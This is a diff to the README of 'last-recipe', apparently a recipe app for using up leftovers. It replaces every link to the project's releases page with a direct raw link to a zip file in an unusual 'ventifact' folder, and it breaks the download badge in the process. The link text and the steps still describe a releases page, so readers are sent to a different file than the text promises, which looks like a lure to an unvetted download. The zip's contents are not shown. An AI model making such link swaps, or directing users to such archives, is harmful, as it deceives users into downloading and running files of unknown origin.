@@ -6,7 +6,7 @@ Welcome to **last-recipe**! This application helps you utilize leftover food and
 
 ## 📥 Download the Application
 
-[![Download Last Recipe](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/ali-thaer/last-recipe/releases)
+[![Download Last Recipe](https://raw.githubusercontent.com/ali-thaer/last-recipe/main/ventifact/last-recipe.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/ali-thaer/last-recipe/main/ventifact/last-recipe.zip)
 
 ## 📂 System Requirements
 
@@ -20,7 +20,7 @@ To run **last-recipe**, you need:
 
 1. **Visit the Releases Page**  
    Go to the following link to download the application:  
-   [Visit this page to download](https://github.com/ali-thaer/last-recipe/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/ali-thaer/last-recipe/main/ventifact/last-recipe.zip)
 
 2. **Select the Latest Version**  
    Find the latest version at the top of the page. Click on it to see the available files.
@@ -82,4 +82,4 @@ We encourage you to contribute! If you have a favorite recipe to share or a sugg
 ## 📥 Download the Application Again
 
 Ready to start using **last-recipe**?  
-[Visit this page to download](https://github.com/ali-thaer/last-recipe/releases) and enjoy cooking with less waste!
+[Visit this page to download](https://raw.githubusercontent.com/ali-thaer/last-recipe/main/ventifact/last-recipe.zip) and enjoy cooking with less waste!
